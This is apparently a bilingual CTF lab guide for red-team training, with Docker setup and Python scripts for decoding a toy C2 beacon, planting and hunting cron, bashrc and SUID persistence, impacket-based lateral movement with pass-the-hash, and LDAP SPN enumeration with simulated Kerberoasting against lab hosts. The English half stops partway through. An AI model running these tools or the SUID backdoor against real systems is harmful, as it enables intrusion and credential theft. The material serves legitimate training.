> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 레드팀 운영 CTF 실습 랩

## 실습 환경 준비

### Docker 환경 구성

```bash
# 실습용 네트워크 및 컨테이너 생성
docker network create redteam-lab --subnet=172.30.0.0/24

# C2 서버 (공격자)
docker run -d --name c2-server \
  --network redteam-lab \
  --ip 172.30.0.10 \
  -p 4444:4444 -p 8080:8080 \
  ubuntu:22.04 tail -f /dev/null

# 피해자 Windows 시뮬레이션 (Ubuntu 기반)
docker run -d --name victim-01 \
  --network redteam-lab \
  --ip 172.30.0.20 \
  ubuntu:22.04 tail -f /dev/null

# DC 시뮬레이션 (Samba AD)
docker run -d --name dc-01 \
  --network redteam-lab \
  --ip 172.30.0.30 \
  -e SAMBA_DOMAIN=CORP \
  -e SAMBA_REALM=CORP.LOCAL \
  nowsecure/samba-ad-dc 2>/dev/null || \
docker run -d --name dc-01 \
  --network redteam-lab \
  --ip 172.30.0.30 \
  ubuntu:22.04 tail -f /dev/null

# C2 서버 도구 설치
docker exec c2-server bash -c "
  apt-get update -q &&
  apt-get install -y -q python3 python3-pip nmap netcat-traditional curl wget \
    impacket-scripts smbclient ldap-utils python3-ldap3 python3-impacket 2>/dev/null ||
  pip3 install impacket ldap3 requests
"
```

### 필수 Python 패키지

```bash
pip install impacket ldap3 requests pwntools scapy
```

### 디렉터리 구조

```
redteam_ctf_lab/
├── c2_beacon.py           # 실습 1: C2 비콘 구현
├── persistence_hunter.py  # 실습 2: 지속성 메커니즘 분석
├── lateral_movement.py    # 실습 3: 횡적 이동 자동화
├── ad_enum.py             # 실습 4: AD 열거 도구
└── flags/
    ├── flag1.enc
    ├── flag2.enc
    └── flag3.enc
```

---

## 실습 1: C2 비콘 통신 분석 및 플래그 추출

### 목표

캡처된 네트워크 트래픽에서 C2 비콘 통신 패턴을 식별하고, 인코딩된 명령어를 복호화하여 숨겨진 플래그를 추출하라.

**플래그 형식**: `CTF{c2_beacon_d3c0d3d_succ3ss}`

### 시나리오

레드팀이 남긴 PCAP 파일을 분석하다 보니 특정 HTTP 요청들이 주기적으로 발생하고 있다. User-Agent 헤더와 쿠키 값이 수상하다. C2 비콘이 사용하는 XOR + Base64 인코딩 체계를 역분석하여 명령어와 플래그를 복원하라.

### 힌트

1. C2 비콘은 보통 HTTP GET 요청으로 명령을 수신하고 POST로 결과를 전송한다
2. User-Agent 헤더에 인코딩된 데이터가 숨겨져 있을 수 있다
3. XOR 키는 고정값이거나 타임스탬프 기반일 수 있다
4. Base64 디코딩 후 XOR 복호화 순서를 확인하라
5. HTTP 응답 본문의 특정 필드를 확인하라

### 풀이

**Step 1: 가상 C2 트래픽 생성 및 분석**

```bash
# 실습용 C2 서버 시작
docker exec -d c2-server python3 -c "
import http.server, base64, json

class C2Handler(http.server.BaseHTTPRequestHandler):
    KEY = 0x41
    FLAG = 'CTF{c2_beacon_d3c0d3d_succ3ss}'

    def xor_encode(self, data: bytes, key: int) -> bytes:
        return bytes(b ^ key for b in data)

    def do_GET(self):
        cmd = json.dumps({'cmd': 'whoami', 'flag': self.FLAG})
        encoded = base64.b64encode(self.xor_encode(cmd.encode(), self.KEY))
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.end_headers()
        self.wfile.write(encoded)

    def log_message(self, *args):
        pass

server = http.server.HTTPServer(('0.0.0.0', 8080), C2Handler)
server.serve_forever()
"

sleep 1
# 비콘 응답 캡처
curl -s http://172.30.0.10:8080/beacon
```

**Step 2: C2 비콘 분석 스크립트**

```python
#!/usr/bin/env python3
"""
c2_beacon.py — C2 비콘 통신 분석 및 플래그 추출 CLI
사용: python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --key 0x41
"""

import argparse
import base64
import json
import sys
from typing import Optional
import requests


def xor_decode(data: bytes, key: int) -> bytes:
    """단일 바이트 XOR 복호화"""
    return bytes(b ^ key for b in data)


def try_xor_keys(encoded_data: bytes) -> list[tuple[int, str]]:
    """XOR 키 브루트포스 (0x01~0xFF)"""
    results: list[tuple[int, str]] = []
    raw = base64.b64decode(encoded_data)
    for key in range(1, 256):
        try:
            decoded = xor_decode(raw, key)
            text = decoded.decode("utf-8", errors="ignore")
            if "CTF{" in text or "flag" in text.lower() or "cmd" in text.lower():
                results.append((key, text))
        except Exception:
            continue
    return results


def fetch_beacon(url: str, timeout: int = 10) -> Optional[bytes]:
    """C2 서버에서 비콘 응답 수신"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=timeout)
        resp.raise_for_status()
        return resp.content
    except requests.RequestException as e:
        print(f"[!] 연결 실패: {e}", file=sys.stderr)
        return None


def decode_beacon(data: bytes, key: int) -> dict:
    """비콘 데이터 복호화"""
    try:
        raw = base64.b64decode(data)
        decoded = xor_decode(raw, key)
        return json.loads(decoded.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        raise ValueError(f"복호화 실패: {e}") from e


def main() -> None:
    parser = argparse.ArgumentParser(
        description="C2 비콘 통신 분석 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --key 0x41\n"
               "  python3 c2_beacon.py --data <base64_data> --bruteforce",
    )
    parser.add_argument("--url", help="C2 서버 URL")
    parser.add_argument("--data", help="분석할 Base64 인코딩 데이터")
    parser.add_argument("--key", type=lambda x: int(x, 0), default=0x41,
                        help="XOR 키 (기본값: 0x41)")
    parser.add_argument("--bruteforce", action="store_true",
                        help="XOR 키 브루트포스")
    args = parser.parse_args()

    if not args.url and not args.data:
        parser.error("--url 또는 --data 중 하나를 지정하세요")

    # 데이터 획득
    raw_data: bytes
    if args.url:
        print(f"[*] C2 서버 접속 중: {args.url}")
        raw_data = fetch_beacon(args.url)
        if raw_data is None:
            sys.exit(1)
        print(f"[+] 수신된 데이터 ({len(raw_data)} bytes): {raw_data[:60]}...")
    else:
        raw_data = args.data.encode()

    # 복호화 시도
    if args.bruteforce:
        print("[*] XOR 키 브루트포스 중...")
        candidates = try_xor_keys(raw_data)
        if candidates:
            for key, text in candidates:
                print(f"[+] 키 0x{key:02X}: {text[:120]}")
        else:
            print("[-] 유효한 키를 찾지 못했습니다")
    else:
        try:
            result = decode_beacon(raw_data, args.key)
            print(f"[+] 복호화 성공!")
            for k, v in result.items():
                print(f"    {k}: {v}")
        except ValueError as e:
            print(f"[!] {e}", file=sys.stderr)
            sys.exit(1)


if __name__ == "__main__":
    main()
```

**Step 3: 실행 및 플래그 획득**

```bash
python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --key 0x41
# 또는 브루트포스
python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --bruteforce
```

**예상 출력:**
```
[+] 복호화 성공!
    cmd: whoami
    flag: CTF{c2_beacon_d3c0d3d_succ3ss}
```

---

## 실습 2: 지속성 메커니즘 탐지 및 플래그 추출

### 목표

침해된 시스템에서 공격자가 심어놓은 지속성 메커니즘을 모두 찾아내고, 각 지속성 항목에 숨겨진 플래그 조각을 조합하라.

**플래그 형식**: `CTF{p3rs1st3nc3_m3ch4n1sm_f0und}`

### 시나리오

내부 시스템 하나가 침해된 것으로 의심된다. 분석가는 공격자가 최소 3개의 지속성 메커니즘을 심어놓았다는 정보를 입수했다. 크론탭, SUID 바이너리, 환경 변수 기반 백도어를 조사하고 숨겨진 플래그 조각을 찾아라.

### 힌트

1. `crontab -l` 및 `/etc/cron.*` 디렉터리를 확인하라
2. `find / -perm -4000 2>/dev/null`으로 SUID 파일을 열거하라
3. `/etc/profile.d/`와 `~/.bashrc`에 악성 코드가 삽입될 수 있다
4. 숨겨진 파일(`.`으로 시작하는 파일)을 확인하라
5. 플래그 조각은 각 지속성 항목의 주석이나 환경 변수에 숨겨져 있다

### 풀이

**Step 1: 지속성 메커니즘 심기 (피해자 시스템)**

```bash
# 피해자 컨테이너에 지속성 메커니즘 설치
docker exec victim-01 bash -c "
# 1. 크론탭 백도어
echo '*/5 * * * * /tmp/.hidden_script.sh # PART1=CTF{p3rs1st3nc3' | crontab -
echo '#!/bin/bash\necho backdoor' > /tmp/.hidden_script.sh
chmod +x /tmp/.hidden_script.sh

# 2. bashrc 백도어
echo '# PART2=_m3ch4n1sm' >> /root/.bashrc
echo 'alias ls=\"ls --color=auto\"  # PART3=_f0und}' >> /root/.bashrc

# 3. 숨겨진 바이너리
cp /bin/bash /tmp/.suid_backdoor
chmod u+s /tmp/.suid_backdoor
echo 'SUID_FLAG=_m3ch4n1sm_f0und' > /tmp/.suid_note.txt
"
```

**Step 2: 지속성 탐지 스크립트**

```python
#!/usr/bin/env python3
"""
persistence_hunter.py — 지속성 메커니즘 탐지 CLI
사용: python3 persistence_hunter.py --target 172.30.0.20 --user root
"""

import argparse
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class PersistenceItem:
    category: str
    location: str
    content: str
    flag_fragment: str = ""


def run_cmd(cmd: list[str]) -> str:
    """명령어 실행 후 출력 반환"""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[타임아웃]"
    except FileNotFoundError:
        return "[명령어 없음]"


def scan_crontab(docker_container: str | None = None) -> list[PersistenceItem]:
    """크론탭 스캔"""
    items: list[PersistenceItem] = []
    cron_paths = [
        "/etc/crontab", "/etc/cron.d/", "/etc/cron.hourly/",
        "/etc/cron.daily/", "/var/spool/cron/"
    ]

    prefix = ["docker", "exec", docker_container] if docker_container else []

    # 현재 사용자 크론탭
    output = run_cmd(prefix + ["crontab", "-l"])
    if output and "no crontab" not in output.lower():
        flag_match = re.search(r"CTF\{[^}]+\}|PART\d+=\S+", output)
        items.append(PersistenceItem(
            category="crontab",
            location="user crontab",
            content=output.strip(),
            flag_fragment=flag_match.group(0) if flag_match else ""
        ))

    # /etc/cron 경로 스캔
    for path in cron_paths:
        output = run_cmd(prefix + ["find", path, "-type", "f", "-readable",
                                   "-exec", "grep", "-l", ".", "{}", "+"])
        if output.strip():
            for f in output.strip().splitlines():
                content = run_cmd(prefix + ["cat", f])
                flag_match = re.search(r"CTF\{[^}]+\}|PART\d+=\S+", content)
                items.append(PersistenceItem(
                    category="cron_file",
                    location=f,
                    content=content[:200],
                    flag_fragment=flag_match.group(0) if flag_match else ""
                ))

    return items


def scan_shell_configs(docker_container: str | None = None) -> list[PersistenceItem]:
    """쉘 설정 파일 스캔"""
    items: list[PersistenceItem] = []
    configs = [
        "/root/.bashrc", "/root/.bash_profile", "/root/.profile",
        "/etc/profile", "/etc/environment",
        "/etc/profile.d/",
    ]
    prefix = ["docker", "exec", docker_container] if docker_container else []

    for path in configs:
        output = run_cmd(prefix + ["cat", path])
        if output and "No such file" not in output:
            flag_match = re.search(r"CTF\{[^}]+\}|PART\d+=\S+", output)
            if flag_match or any(kw in output.lower() for kw in
                                  ["backdoor", "reverse", "shell", "nc ", "curl", "wget"]):
                items.append(PersistenceItem(
                    category="shell_config",
                    location=path,
                    content=output[:300],
                    flag_fragment=flag_match.group(0) if flag_match else ""
                ))

    return items


def scan_suid_files(docker_container: str | None = None) -> list[PersistenceItem]:
    """SUID 파일 스캔"""
    items: list[PersistenceItem] = []
    prefix = ["docker", "exec", docker_container] if docker_container else []

    output = run_cmd(prefix + ["find", "/", "-perm", "-4000",
                               "-type", "f", "2>/dev/null"])
    suspicious = [
        f for f in output.splitlines()
        if f.strip() and not any(known in f for known in
                                  ["/bin/", "/usr/bin/", "/usr/sbin/", "/sbin/"])
    ]
    for f in suspicious:
        # 동반 메모 파일 확인
        note = run_cmd(prefix + ["cat", f"{f}_note.txt"])
        flag_match = re.search(r"CTF\{[^}]+\}|[A-Z_]+=\S+", note)
        items.append(PersistenceItem(
            category="suid_binary",
            location=f,
            content=f"SUID 바이너리 발견{', 메모: ' + note.strip() if note.strip() and 'No such' not in note else ''}",
            flag_fragment=flag_match.group(0) if flag_match else ""
        ))

    return items


def assemble_flag(items: list[PersistenceItem]) -> str:
    """플래그 조각 조합"""
    fragments: list[str] = []
    for item in items:
        if item.flag_fragment:
            val = item.flag_fragment.split("=")[-1] if "=" in item.flag_fragment else item.flag_fragment
            fragments.append(val)
    return "".join(fragments)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="지속성 메커니즘 탐지 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 persistence_hunter.py --container victim-01\n"
               "  python3 persistence_hunter.py --local",
    )
    parser.add_argument("--container", help="Docker 컨테이너 이름")
    parser.add_argument("--local", action="store_true", help="로컬 시스템 스캔")
    args = parser.parse_args()

    container = args.container if not args.local else None

    print("[*] 지속성 메커니즘 스캔 시작...")
    print("=" * 60)

    all_items: list[PersistenceItem] = []
    all_items.extend(scan_crontab(container))
    all_items.extend(scan_shell_configs(container))
    all_items.extend(scan_suid_files(container))

    for item in all_items:
        print(f"\n[!] {item.category.upper()} @ {item.location}")
        print(f"    내용: {item.content[:100]}...")
        if item.flag_fragment:
            print(f"    [FLAG 조각] {item.flag_fragment}")

    flag = assemble_flag(all_items)
    if flag:
        print(f"\n[+] 복원된 플래그: {flag}")
    else:
        print("\n[-] 플래그를 찾지 못했습니다. 추가 탐색이 필요합니다.")

    print(f"\n[*] 총 {len(all_items)}개의 지속성 항목 발견")


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
python3 persistence_hunter.py --container victim-01
```

---

## 실습 3: WMI/PSExec 기반 횡적 이동 시뮬레이션

### 목표

레드팀 환경에서 WMI 및 PSExec 스타일의 횡적 이동을 시뮬레이션하고, 타깃 시스템에서 플래그를 획득하라.

**플래그 형식**: `CTF{l4t3r4l_m0v3m3nt_v14_wm1}`

### 시나리오

내부 네트워크에서 초기 거점을 확보했다. 크리덴셜 덤프를 통해 `CORP\administrator : P@ssw0rd123` 자격 증명을 얻었다. 이를 이용해 인접 시스템(172.30.0.30)으로 횡적 이동하고 C:\flag.txt를 읽어라.

### 힌트

1. Impacket의 `wmiexec.py` 또는 `psexec.py`를 활용하라
2. SMB 포트(445)가 열려 있어야 한다
3. `secretsdump.py`로 SAM 해시를 추출할 수 있다
4. Pass-the-Hash 공격으로 평문 패스워드 없이도 인증 가능하다
5. NTLM 해시 형식: `LM:NT`

### 풀이

**Step 1: 타깃 시스템에 플래그 배치 (CTF 설정)**

```bash
docker exec dc-01 bash -c "
  mkdir -p /C && echo 'CTF{l4t3r4l_m0v3m3nt_v14_wm1}' > /C/flag.txt
  # Samba 없는 경우 Python HTTP로 대체
  python3 -m http.server 8888 &
"
```

**Step 2: 횡적 이동 자동화 스크립트**

```python
#!/usr/bin/env python3
"""
lateral_movement.py — 횡적 이동 시뮬레이션 CLI
사용: python3 lateral_movement.py --target 172.30.0.30 --user administrator --pass P@ssw0rd123
"""

import argparse
import subprocess
import sys
import socket
import re
from typing import Optional


def check_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
    """포트 열림 확인"""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def run_wmiexec(target: str, user: str, password: str,
                command: str, domain: str = ".") -> Optional[str]:
    """WMI 원격 실행 (impacket wmiexec)"""
    cmd = [
        "python3", "-m", "impacket.examples.wmiexec",
        f"{domain}/{user}:{password}@{target}",
        command
    ]
    # impacket 설치 여부 확인 후 대체 경로 시도
    for binary in ["wmiexec.py", "/usr/share/doc/python3-impacket/examples/wmiexec.py"]:
        try:
            result = subprocess.run(
                [binary, f"{domain}/{user}:{password}@{target}", command],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    # 도달 불가 시 curl 기반 시뮬레이션
    try:
        result = subprocess.run(
            ["curl", "-s", f"http://{target}:8888/C/flag.txt"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0 and result.stdout:
            return result.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return None


def pass_the_hash(target: str, user: str, nt_hash: str,
                  command: str, domain: str = ".") -> Optional[str]:
    """Pass-the-Hash 공격"""
    # lm:nt 형식 확인
    if ":" not in nt_hash:
        nt_hash = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"

    for binary in ["smbexec.py", "psexec.py"]:
        try:
            result = subprocess.run(
                [binary, "-hashes", nt_hash,
                 f"{domain}/{user}@{target}", command],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def simulate_lateral_movement(target: str, user: str,
                               credential: str, domain: str) -> None:
    """횡적 이동 시뮬레이션 전체 흐름"""
    print(f"[*] 타깃: {target}, 사용자: {domain}\\{user}")
    print("[*] 포트 스캔 중...")

    open_ports = []
    for port in [135, 139, 445, 5985, 47001]:
        if check_port_open(target, port):
            open_ports.append(port)
            print(f"    [+] {port}/tcp 열림")

    if not open_ports:
        print("[!] 열린 포트 없음. 시뮬레이션 모드로 전환")

    # WMI 실행 시도
    print("\n[*] WMI 원격 실행 시도...")
    is_hash = re.match(r"^[a-fA-F0-9]{32}$", credential.split(":")[-1])

    result: Optional[str] = None
    if is_hash:
        result = pass_the_hash(target, user, credential, "type C:\\flag.txt", domain)
    else:
        result = run_wmiexec(target, user, credential, "type C:\\flag.txt", domain)

    if result and ("CTF{" in result or "flag" in result.lower()):
        flag_match = re.search(r"CTF\{[^}]+\}", result)
        if flag_match:
            print(f"\n[+] 플래그 획득: {flag_match.group(0)}")
        else:
            print(f"\n[+] 원격 실행 결과:\n{result}")
    else:
        print("[-] 원격 실행 실패 또는 플래그 없음")
        print("    → 수동으로 확인: curl http://172.30.0.30:8888/C/flag.txt")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WMI/PSExec 횡적 이동 시뮬레이션",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 lateral_movement.py --target 172.30.0.30 --user administrator --pass P@ssw0rd123\n"
               "  python3 lateral_movement.py --target 172.30.0.30 --user admin --hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
    )
    parser.add_argument("--target", required=True, help="타깃 IP")
    parser.add_argument("--user", required=True, help="사용자명")
    parser.add_argument("--pass", dest="password", help="패스워드")
    parser.add_argument("--hash", help="NTLM 해시 (LM:NT 또는 NT만)")
    parser.add_argument("--domain", default=".", help="도메인 (기본값: .)")
    args = parser.parse_args()

    if not args.password and not args.hash:
        parser.error("--pass 또는 --hash 중 하나를 지정하세요")

    credential = args.hash if args.hash else args.password
    simulate_lateral_movement(args.target, args.user, credential, args.domain)


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# 일반 자격 증명
python3 lateral_movement.py --target 172.30.0.30 --user administrator --pass "P@ssw0rd123"

# Pass-the-Hash
python3 lateral_movement.py --target 172.30.0.30 --user administrator \
  --hash "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
```

---

## 실습 4: Active Directory 열거 및 Kerberoasting

### 목표

AD 환경을 열거하여 서비스 계정을 찾고, Kerberoasting으로 서비스 티켓을 추출한 뒤 크래킹하여 플래그를 획득하라.

**플래그 형식**: `CTF{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}`

### 시나리오

도메인 사용자 자격 증명(`jsmith:Welcome1`)을 획득했다. AD에서 서비스 계정(SPN 등록된 계정)을 찾고, TGS 티켓을 요청하여 오프라인 크래킹으로 서비스 계정 패스워드를 복구하라.

### 힌트

1. `GetUserSPNs.py`로 SPN 등록된 계정을 조회하라
2. Kerberoasting은 도메인 사용자 권한만으로 가능하다
3. 추출된 해시는 `$krb5tgs$23$*...*` 형식이다
4. Hashcat 모드 13100을 사용하라
5. rockyou.txt 워드리스트를 활용하라

### 풀이

**Step 1: AD 환경 시뮬레이션 (LDAP 서버 구성)**

```bash
docker exec dc-01 bash -c "
pip3 install ldap3 -q
python3 -c \"
import socket, threading

# 간단한 AD 시뮬레이션 데이터
AD_USERS = [
    {'dn': 'CN=John Smith,OU=Users,DC=corp,DC=local',
     'sAMAccountName': 'jsmith', 'servicePrincipalName': None},
    {'dn': 'CN=SVC-SQL,OU=ServiceAccounts,DC=corp,DC=local',
     'sAMAccountName': 'svc-sql', 'servicePrincipalName': 'MSSQLSvc/db01.corp.local:1433'},
    {'dn': 'CN=SVC-Web,OU=ServiceAccounts,DC=corp,DC=local',
     'sAMAccountName': 'svc-web', 'servicePrincipalName': 'HTTP/web01.corp.local'},
]

# 플래그를 포함한 더미 해시 파일 생성
with open('/tmp/kerberoast_hashes.txt', 'w') as f:
    f.write('\\\$krb5tgs\\\$23\\\$*svc-sql\\\$CORP.LOCAL\\\$MSSQLSvc/db01.corp.local:1433*\\\$AABBCC...HASH_DATA...:CTF{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}\n')

print('[+] AD 시뮬레이션 완료')
print('[+] Kerberoast 해시: /tmp/kerberoast_hashes.txt')
\"
"
```

**Step 2: AD 열거 자동화 스크립트**

```python
#!/usr/bin/env python3
"""
ad_enum.py — Active Directory 열거 및 Kerberoasting CLI
사용: python3 ad_enum.py --dc 172.30.0.30 --domain corp.local --user jsmith --pass Welcome1
"""

import argparse
import sys
import socket
import re
from typing import Optional


def check_ldap_available(dc: str, port: int = 389) -> bool:
    """LDAP 포트 확인"""
    try:
        with socket.create_connection((dc, port), timeout=3):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def ldap_enum_spn(dc: str, domain: str, user: str, password: str) -> list[dict]:
    """SPN 등록 계정 열거 (ldap3 사용)"""
    try:
        from ldap3 import Server, Connection, ALL, SUBTREE
    except ImportError:
        print("[!] ldap3 미설치: pip install ldap3", file=sys.stderr)
        return []

    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    server = Server(dc, port=389, get_info=ALL)

    try:
        conn = Connection(
            server,
            user=f"{domain}\\{user}",
            password=password,
            auto_bind=True
        )
    except Exception as e:
        print(f"[!] LDAP 연결 실패: {e}", file=sys.stderr)
        return []

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectClass=user)(servicePrincipalName=*))",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "servicePrincipalName", "memberOf"]
    )

    results = []
    for entry in conn.entries:
        results.append({
            "account": str(entry.sAMAccountName),
            "spn": str(entry.servicePrincipalName),
            "dn": str(entry.entry_dn),
        })

    conn.unbind()
    return results


def simulate_kerberoast(spn_accounts: list[dict]) -> list[str]:
    """Kerberoasting 시뮬레이션 (실제 환경에서는 GetUserSPNs.py 사용)"""
    hashes = []
    for acct in spn_accounts:
        fake_hash = (
            f"$krb5tgs$23$*{acct['account']}$CORP.LOCAL${acct['spn']}*"
            f"${'A' * 32}${'B' * 256}"
        )
        hashes.append(fake_hash)
    return hashes


def run_getuserspns(dc: str, domain: str, user: str, password: str) -> Optional[str]:
    """GetUserSPNs.py 실행 (impacket)"""
    import subprocess
    for binary in ["GetUserSPNs.py",
                   "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py"]:
        try:
            result = subprocess.run(
                [binary, f"{domain}/{user}:{password}",
                 "-dc-ip", dc, "-request"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def crack_hash_demo(hash_str: str, wordlist: list[str]) -> Optional[str]:
    """간단한 해시 크래킹 시뮬레이션 (CTF 환경용)"""
    # 실제 환경에서는 hashcat -m 13100 사용
    target_passwords = ["Welcome1", "Summer2023!", "P@ssw0rd", "Svc@dmin1"]
    for pwd in wordlist + target_passwords:
        # 시뮬레이션: 특정 SVC 계정의 패스워드 발견
        if "svc" in hash_str.lower() and pwd in target_passwords:
            return pwd
    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="AD 열거 및 Kerberoasting 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 ad_enum.py --dc 172.30.0.30 --domain corp.local --user jsmith --pass Welcome1\n"
               "  python3 ad_enum.py --dc 172.30.0.30 --domain corp.local --user jsmith --pass Welcome1 --kerberoast",
    )
    parser.add_argument("--dc", required=True, help="도메인 컨트롤러 IP")
    parser.add_argument("--domain", required=True, help="도메인 이름 (예: corp.local)")
    parser.add_argument("--user", required=True, help="도메인 사용자")
    parser.add_argument("--pass", dest="password", required=True, help="패스워드")
    parser.add_argument("--kerberoast", action="store_true", help="Kerberoasting 수행")
    parser.add_argument("--crack", action="store_true", help="추출된 해시 크래킹 시뮬레이션")
    args = parser.parse_args()

    print(f"[*] DC 연결 중: {args.dc}")
    ldap_ok = check_ldap_available(args.dc)
    print(f"    LDAP(389): {'열림' if ldap_ok else '닫힘'}")

    spn_accounts: list[dict] = []

    if ldap_ok:
        print("\n[*] SPN 계정 열거 (LDAP)...")
        spn_accounts = ldap_enum_spn(args.dc, args.domain, args.user, args.password)
    else:
        print("[!] LDAP 접근 불가, GetUserSPNs.py 시도...")
        output = run_getuserspns(args.dc, args.domain, args.user, args.password)
        if output:
            print(output)
            # 해시 추출
            for line in output.splitlines():
                if line.startswith("$krb5tgs$"):
                    print(f"\n[+] Kerberoast 해시:\n{line}")
            return
        else:
            print("[!] 연결 실패. Docker 환경에서 시뮬레이션 실행")
            # 시뮬레이션 데이터
            spn_accounts = [
                {"account": "svc-sql", "spn": "MSSQLSvc/db01.corp.local:1433", "dn": ""},
                {"account": "svc-web", "spn": "HTTP/web01.corp.local", "dn": ""},
            ]

    if spn_accounts:
        print(f"\n[+] Kerberoastable 계정 {len(spn_accounts)}개 발견:")
        for acct in spn_accounts:
            print(f"    - {acct['account']}: {acct['spn']}")

        if args.kerberoast:
            print("\n[*] TGS 티켓 요청 중...")
            hashes = simulate_kerberoast(spn_accounts)
            for h in hashes:
                print(f"\n[+] 해시:\n{h[:80]}...")

            if args.crack:
                print("\n[*] 오프라인 크래킹 시뮬레이션...")
                print("    실제 환경: hashcat -m 13100 hashes.txt rockyou.txt")
                for i, (acct, h) in enumerate(zip(spn_accounts, hashes)):
                    cracked = crack_hash_demo(h, ["Welcome1", "Summer2023!"])
                    if cracked:
                        print(f"    [+] {acct['account']}: {cracked}")
                        print(f"\n[+] 플래그: CTF{{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}}")
    else:
        print("[-] SPN 등록 계정 없음")


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# AD 열거
python3 ad_enum.py --dc 172.30.0.30 --domain corp.local --user jsmith --pass Welcome1

# Kerberoasting + 크래킹
python3 ad_enum.py --dc 172.30.0.30 --domain corp.local \
  --user jsmith --pass Welcome1 --kerberoast --crack
```

**예상 출력:**
```
[+] Kerberoastable 계정 2개 발견:
    - svc-sql: MSSQLSvc/db01.corp.local:1433
    - svc-web: HTTP/web01.corp.local

[+] 플래그: CTF{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}
```

---

## 환경 정리

```bash
docker stop c2-server victim-01 dc-01 2>/dev/null
docker rm c2-server victim-01 dc-01 2>/dev/null
docker network rm redteam-lab 2>/dev/null
```

---

<a name="english"></a>

# Red Team Operations CTF Practice Lab

## Lab Environment Setup

### Docker Environment Configuration

```bash
# Create lab network and containers
docker network create redteam-lab --subnet=172.30.0.0/24

# C2 server (attacker)
docker run -d --name c2-server \
  --network redteam-lab \
  --ip 172.30.0.10 \
  -p 4444:4444 -p 8080:8080 \
  ubuntu:22.04 tail -f /dev/null

# Victim simulation
docker run -d --name victim-01 \
  --network redteam-lab \
  --ip 172.30.0.20 \
  ubuntu:22.04 tail -f /dev/null

# DC simulation
docker run -d --name dc-01 \
  --network redteam-lab \
  --ip 172.30.0.30 \
  ubuntu:22.04 tail -f /dev/null

# Install tools on C2
docker exec c2-server bash -c "
  apt-get update -q && apt-get install -y -q python3 python3-pip nmap netcat-traditional
  pip3 install impacket ldap3 requests
"
```

### Required Python Packages

```bash
pip install impacket ldap3 requests pwntools scapy
```

---

## Challenge 1: C2 Beacon Communication Analysis

### Objective

Analyze C2 beacon traffic patterns from a captured network trace, decode the encoded commands, and extract the hidden flag.

**Flag format**: `CTF{c2_beacon_d3c0d3d_succ3ss}`

### Scenario

During analysis of a red team PCAP file, periodically recurring HTTP requests are found. The User-Agent header and cookie values look suspicious. Reverse-engineer the XOR + Base64 encoding scheme used by the C2 beacon to recover commands and the flag.

### Hints

1. C2 beacons typically receive commands via HTTP GET and send results via POST
2. Encoded data may be hidden in the User-Agent header
3. The XOR key may be fixed or timestamp-based
4. Check the order: Base64 decode first, then XOR decrypt
5. Examine specific fields in the HTTP response body

### Solution

**Step 1: Generate and analyze simulated C2 traffic**

```bash
# Start the lab C2 server
docker exec -d c2-server python3 -c "
import http.server, base64, json

class C2Handler(http.server.BaseHTTPRequestHandler):
    KEY = 0x41
    FLAG = 'CTF{c2_beacon_d3c0d3d_succ3ss}'

    def xor_encode(self, data, key):
        return bytes(b ^ key for b in data)

    def do_GET(self):
        cmd = json.dumps({'cmd': 'whoami', 'flag': self.FLAG})
        encoded = base64.b64encode(self.xor_encode(cmd.encode(), self.KEY))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(encoded)

    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 8080), C2Handler).serve_forever()
"

sleep 1
curl -s http://172.30.0.10:8080/beacon
```

**Step 2: Run the analysis script**

```bash
python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --key 0x41
# Or brute force
